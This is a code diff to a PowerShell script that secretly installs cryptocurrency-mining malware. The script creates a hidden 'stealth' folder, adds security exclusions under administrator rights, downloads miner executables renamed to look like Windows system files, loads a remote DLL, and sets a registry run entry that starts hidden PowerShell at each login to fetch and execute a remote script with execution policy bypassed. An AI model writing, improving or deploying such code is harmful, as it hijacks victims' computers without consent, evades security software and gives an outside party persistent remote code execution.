@@ -1,13 +1,13 @@
 $GithubUser = "HolyV200"
 $RepoName = "btcminer-"
 $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
-$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
-$GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
+$CpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_x.exe"
+$GpuUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/WinSystem_g.exe"
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
 
 $StealthDir = "$env:LOCALAPPDATA\WinSys"
 
-Write-Host "[1/6] Initializing network protocols..." -ForegroundColor Cyan
+Write-Host "[1/5] Initializing network protocols..." -ForegroundColor Cyan
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::CheckCertificateRevocationList = $false
 
@@ -32,14 +32,14 @@ function Get-StealthFile($Url, $Path) {
     return $false
 }
 
-Write-Host "[2/6] Preparing stealth directory & clearing locks..." -ForegroundColor Cyan
+Write-Host "[2/5] Preparing stealth directory & clearing locks..." -ForegroundColor Cyan
 if (-not (Test-Path $StealthDir)) {
     New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
 } else {
     Get-Process | Where-Object { $_.Name -match "WinSystem" -or $_.Path -like "*WinSys*" } | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "[3/6] Configuring security exclusions..." -ForegroundColor Cyan
+Write-Host "[3/5] Configuring security exclusions..." -ForegroundColor Cyan
 try {
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -47,26 +47,16 @@ try {
     }
 } catch { }
 
-$CpuZip = Join-Path $StealthDir "upd_c.zip"
-$GpuZip = Join-Path $StealthDir "upd_g.zip"
 $CpuExe = Join-Path $StealthDir "WinSystem_x.exe"
 $GpuExe = Join-Path $StealthDir "WinSystem_g.exe"
 
-Write-Host "[4/6] Downloading & extracting CPU engine..." -ForegroundColor Cyan
+Write-Host "[4/5] Deploying Turbo CPU and GPU engines..." -ForegroundColor Cyan
+# CPU Download
 if (-not (Test-Path $CpuExe)) {
-    if (Get-StealthFile $MinerUrl $CpuZip) {
-        if ((Get-Item $CpuZip).Length -gt 100000) {
-            try {
-                Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
-                Remove-Item $CpuZip -Force
-                $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
-                if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
-            } catch { }
-        }
-    }
+    Get-StealthFile $CpuUrl $CpuExe | Out-Null
 }
 
-Write-Host "[5/6] Checking for GPU hardware..." -ForegroundColor Cyan
+# GPU Check and Download
 $GpuDetected = $null
 try {
     $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
@@ -76,19 +66,10 @@ try {
 } catch { }
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
-    if (Get-StealthFile $GpuMinerUrl $GpuZip) {
-        if ((Get-Item $GpuZip).Length -gt 100000) {
-            try {
-                Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
-                Remove-Item $GpuZip -Force
-                $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
-                if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
-            } catch { }
-        }
-    }
+    Get-StealthFile $GpuUrl $GpuExe | Out-Null
 }
 
-Write-Host "[6/6] Finalizing loader & persistence..." -ForegroundColor Cyan
+Write-Host "[5/5] Finalizing loader & persistence..." -ForegroundColor Cyan
 try {
     $DllPath = Join-Path $StealthDir "Bridge.dll"
     if (Get-StealthFile $DllUrl $DllPath) {
@@ -106,7 +87,7 @@ try {
             $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[Net.ServicePointManager]::CheckCertificateRevocationList = `$false; iwr -useb 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
             Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
             
-            Write-Host "`nDEPLOYMENT SUCCESSFUL - Worker is now hidden and hashing." -ForegroundColor Green
+            Write-Host "`nTURBO DEPLOYMENT SUCCESSFUL - Hashing active." -ForegroundColor Green
         }
     }
 } catch {
